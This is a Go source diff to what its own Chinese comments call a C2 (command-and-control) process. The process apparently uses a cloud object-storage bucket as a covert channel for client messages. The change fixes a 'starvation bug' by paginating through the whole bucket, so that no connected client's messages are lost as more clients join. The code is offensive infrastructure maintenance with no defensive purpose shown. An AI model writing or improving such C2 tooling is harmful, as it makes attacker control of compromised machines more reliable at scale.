@@ -47,16 +47,30 @@ func InitClient(endPoint, accessKeyId, accessKeySecret, bucketName string) error
 	return nil
 }
 func List(c *Client) []oss.ObjectProperties {
-
-	lsRes, err := c.Bucket.ListObjects(oss.MaxKeys(3), oss.Prefix(""))
-	if err != nil {
-		// 错误返回空列表，不让单次 OSS 故障杀死整个 C2 进程
-		logx.Println("Error:", err)
-		return nil
+	// 【饥饿 bug 修复】原 MaxKeys(3) 只列字典序前 3 个对象:桶内对象多于 3 时
+	// (多客户端/消息积压),第 4 个及以后的客户端消息永远取不到——轮询看似
+	// 正常但特定客户端永久失联。改为分页遍历全桶。
+	var all []oss.ObjectProperties
+	marker := ""
+	for {
+		lsRes, err := c.Bucket.ListObjects(oss.MaxKeys(200), oss.Marker(marker))
+		if err != nil {
+			// 错误返回已取部分，不让单次 OSS 故障杀死整个 C2 进程
+			logx.Println("Error:", err)
+			return all
+		}
+		all = append(all, lsRes.Objects...)
+		if !lsRes.IsTruncated {
+			return all
+		}
+		marker = lsRes.NextMarker
+		if marker == "" && len(lsRes.Objects) > 0 {
+			marker = lsRes.Objects[len(lsRes.Objects)-1].Key
+		}
+		if marker == "" {
+			return all
+		}
 	}
-	//logx.Println(lsRes)
-	return lsRes.Objects
-
 }
 func Send(c *Client, name string, content []byte) {
 	encodeData, err := encrypt.EncodeBase64(content)
